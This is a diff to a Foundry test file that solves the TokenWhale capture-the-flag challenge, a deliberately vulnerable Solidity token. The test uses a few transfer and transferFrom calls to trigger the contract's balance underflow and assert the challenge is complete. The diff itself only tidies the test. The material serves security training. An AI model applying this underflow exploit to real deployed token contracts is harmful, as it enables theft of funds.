@@ -16,7 +16,6 @@ contract TokenWhaleChallengeTest is Test {
     }
 
     function testTokenWhale() public {
-        uint256 beforeValue = alice.balance;
         emit log_named_uint("alice value", tokenWhaleChallenge.balanceOf(alice));
 
         vm.startPrank(bob);
@@ -26,9 +25,10 @@ contract TokenWhaleChallengeTest is Test {
         vm.startPrank(alice);
             tokenWhaleChallenge.transfer(bob, 1000);
             tokenWhaleChallenge.transferFrom(bob, address(0), 1);
+        vm.stopPrank();
 
-            uint256 balance = tokenWhaleChallenge.balanceOf(alice);
-            emit log_named_uint("alice value", balance);
+        uint256 balance = tokenWhaleChallenge.balanceOf(alice);
+        emit log_named_uint("alice value", balance);
         
         assertEq(tokenWhaleChallenge.isComplete(), true);
     }
